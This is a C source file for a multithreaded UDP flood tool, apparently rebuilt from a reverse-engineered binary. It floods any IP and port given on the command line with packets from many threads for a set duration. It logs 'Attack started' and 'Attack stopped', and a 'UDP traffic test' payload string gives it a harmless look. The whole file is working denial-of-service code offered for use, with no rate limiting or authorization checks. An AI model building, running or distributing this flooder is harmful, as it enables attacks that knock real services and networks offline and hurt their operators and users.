#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <unistd.h>

#define PAYLOAD_SIZE 8008  // As per the Angr and Ghidra code, fixed buffer size
#define PADDING_SIZE 0x200000

char* ip;  // IP address
int port;  // Port number
int duration;  // Duration in seconds
int thread_count;  // Number of threads
char padding_data[PADDING_SIZE];  // Padding buffer for data

// Function to get the current time as a formatted string
void print_current_time(const char* message) {
    time_t now;
    time(&now);
    char* time_str = ctime(&now);
    time_str[strlen(time_str) - 1] = '\0';  // Remove newline character
    printf("%s: %s\n", message, time_str);
}

// Replicating the UDP traffic logic from Angr
void* send_udp_traffic(void* arg) {
    int sockfd;
    struct sockaddr_in servaddr;
    char buffer[PAYLOAD_SIZE];  // Fixed buffer size
    time_t start_time;
    ssize_t sVar3;
    
    // Prepare socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Prepare address and port
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &servaddr.sin_addr) <= 0) {
        perror("Invalid address / Address not supported");
        close(sockfd);
        pthread_exit(NULL);
    }

    // Fill the buffer with the fixed message
    snprintf(buffer, 8000, "UDP traffic test");  // Same message as in Angr code

    // Get the start time
    start_time = time(NULL);
    
    // Send packets continuously for the duration of the test
    while (time(NULL) - start_time < duration) {
        sVar3 = sendto(sockfd, buffer, strlen(buffer), 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
        if (sVar3 < 0) {
            perror("Send failed");
            close(sockfd);
            pthread_exit(NULL);
        }
    }

    // Close the socket
    close(sockfd);
    pthread_exit(NULL);
}

int main(int argc, char **argv) {
    pthread_t* threads;
    int i;

    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        return 1;
    }

    // Assigning command-line arguments
    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    thread_count = atoi(argv[4]);

    memset(padding_data, 0, PADDING_SIZE);

    // Print attack started with current time
    print_current_time("Attack started");

    // Allocate memory for thread handles
    threads = malloc(thread_count * sizeof(pthread_t));
    if (threads == NULL) {
        perror("Memory allocation failed");
        return 1;
    }

    // Create the threads to send UDP traffic
    for (i = 0; i < thread_count; i++) {
        if (pthread_create(&threads[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            free(threads);
            return 1;
        }
    }

    // Wait for all threads to finish
    for (i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    // Print attack stopped with current time
    print_current_time("Attack stopped");

    free(threads);
    return 0;
}
